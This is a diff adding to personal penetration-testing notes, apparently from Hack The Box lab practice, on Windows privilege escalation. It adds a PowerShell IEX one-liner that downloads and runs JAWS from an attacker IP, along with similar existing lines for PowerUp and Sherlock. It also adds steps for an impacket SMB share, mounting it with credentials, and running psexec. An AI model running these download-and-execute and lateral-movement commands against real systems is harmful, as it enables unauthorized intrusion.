@@ -180,6 +180,12 @@ echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:8080/PowerU
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:8080/Sherlock.ps1') | powershell -noprofile -
 ```
 
+## Jaws
+```
+echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:8080/jaws-enum.ps1') | powershell -noprofile -
+```
+
+
 ## Write Files
 We need to run winpeas somewhere so will find locations like this work
 ```
@@ -232,4 +238,35 @@ With both of these privs, I can use `robocopy` to read files (see [PayloadsAl
 ## Scripts
 
 - [ ] winpeas  https://github.com/carlospolop/PEASS-ng/releases/tag/20221211
-- [ ] 
+
+
+
+
+## Setting up a SMB-share to run Winpeas
+I was not able to run Winpeas earlier but after seeing the video they have taught a way to do that. We have to make a smb share with user and password so let's give it a try for myself and see what happens.
+
+```
+impacket-smbserver Hackthebox $(pwd) -smb2support -user testing -password testing
+```
+
+
+## Get a NEW PSDrive 
+
+So to do that we have to put the user and password in Credential Object.
+```
+$pass = convertto-securestring 'testing' -AsPlainText -Force 
+```
+
+```
+$cred= New-Object System.Management.Automation.PSCredential('testing', $pass)
+```
+
+```
+New-PSDrive -Name testing -PSProvider FileSystem -Credential $cred -Root \\10.10.16.8\Hackthebox
+```
+
+```
+python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+```
+
+
